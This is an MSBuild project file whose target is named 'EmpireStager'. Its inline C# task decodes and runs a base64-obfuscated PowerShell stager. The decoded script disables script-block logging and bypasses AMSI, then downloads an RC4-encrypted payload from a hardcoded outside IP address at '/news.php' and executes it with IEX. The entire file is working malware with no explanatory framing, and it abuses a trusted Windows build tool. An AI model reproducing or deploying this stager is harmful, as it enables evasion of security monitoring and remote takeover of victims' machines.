<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="EmpireStager"><ClassExample /></Target><UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" ><Task><Reference Include="System.Management.Automation" /><Using Namespace="System" /><Using Namespace="System.IO" /><Using Namespace="System.Reflection" /><Using Namespace="System.Collections.Generic" /><Code Type="Class" Language="cs"><![CDATA[ using System;using System.IO;using System.Diagnostics;using System.Reflection;using System.Runtime.InteropServices;using System.Collections.ObjectModel;using System.Management.Automation;using System.Management.Automation.Runspaces;using System.Text;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample :  Task, ITask{public override bool Execute(){byte[] data = Convert.FromBase64String("SQBGACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBFAHIAcwBpAG8ATgAuAE0AQQBKAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBTAEUATQBiAGwAWQAuAEcARQB0AFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAdABWAEEAbAB1AGUAKAAkAE4AdQBsAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBMAD0AWwBDAE8AbABMAEUAYwBUAEkATwBOAFMALgBHAGUAbgBFAHIASQBjAC4ARABpAEMAVABJAE8ATgBBAHIAWQBbAHMAVAByAEkAbgBHACwAUwB5AHMAVABFAG0ALgBPAGIASgBlAGMAVABdAF0AOgA6AE4ARQBXACgAKQA7ACQAdgBhAGwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUATABzAGUAewBbAFMAQwByAEkAUABUAEIAbABPAEMAawBdAC4AIgBHAGUAVABGAEkARQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAVQBlACgAJABuAHUAbABsACwAKABOAGUAdwAtAE8AQgBKAGUAQwBUACAAQwBvAGwAbABlAEMAdABJAG8ATgBzAC4ARwBFAG4AZQBSAEkAQwAuAEgAQQBTAEgAUwBlAHQAWwBzAFQAUgBpAE4AZwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUAbQBiAEwAeQAuAEcARQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAHQARgBJAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEATABVAGUAKAAkAE4AVQBsAGwALAAkAFQAcgBVAEUAKQB9ADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAdAAuAFMARQByAHYASQBjAGUAUABPAGkAbgB0AE0AYQBuAEEAZwBlAFIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBPAE4AdABpAG4AVQBFAD0AMAA7ACQAdwBDAD0ATgBlAFcALQBPAGIASgBlAGMAdAAgAFMAeQBzAHQARQBtAC4ATgBFAHQALgBXAGUAYgBDAEwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgARQBhAGQARQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAAUgBvAHgAWQA9AFsAUwB5AHMAdABlAG0ALgBOAEUAVAAuAFcARQBCAFIAZQBRAHUARQBTAFQAXQA6ADoARABFAGYAQQB1AGwAVABXAEUAYgBQAHIATwB4AFkAOwAkAFcAQwAuAFAAUgBvAFgAWQAuAEMAUgBFAEQAZQBOAFQAaQBBAEwAcwAgAD0AIABbAFMAeQBTAHQARQBtAC4ATgBlAHQALgBDAHIAZQBEAEUATgBUAGkAQQBMAEMAQQBjAGgAZQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AFcATwBSAEsAQwBSAGUARABlAE4AdABJAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABFAG0ALgBUAGUAeAB0AC4ARQBOAGMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAUwAoACcAQAA7AH4AKgBkAF8AIQBFAFUAPQBSAFAAdQBdAGcARwBtAG4AJQBpADUALABjAHYAfAAyAD8AKwBzAFQALgBPACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgAxADkAOQAuADgAMAAuADEAOQAwADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAQQBEAGUAcgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQA0AEMAMgB3AEsASABDAHAATQBJAFEATgBSACsAZgBlAGQAYQBjADkAWABUAEgAbQB0AEQAcwA9ACIAKQA7ACQARABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBsAG8AQQBkAEQAYQB0AGEAKAAkAFMAZQByACsAJAB0ACkAOwAkAEkAVgA9ACQARABBAHQAQQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABBAFQAQQBbADQALgAuACQAZABBAFQAYQAuAGwARQBuAGcAdABIAF0AOwAtAEoATwBJAG4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA");string script = Encoding.Unicode.GetString(data);PSExecute(script);return true;}public static void PSExecute(string cmd){Runspace runspace = RunspaceFactory.CreateRunspace();runspace.Open();Pipeline pipeline = runspace.CreatePipeline();pipeline.Commands.AddScript(cmd);pipeline.InvokeAsync();}} ]]></Code></Task></UsingTask></Project>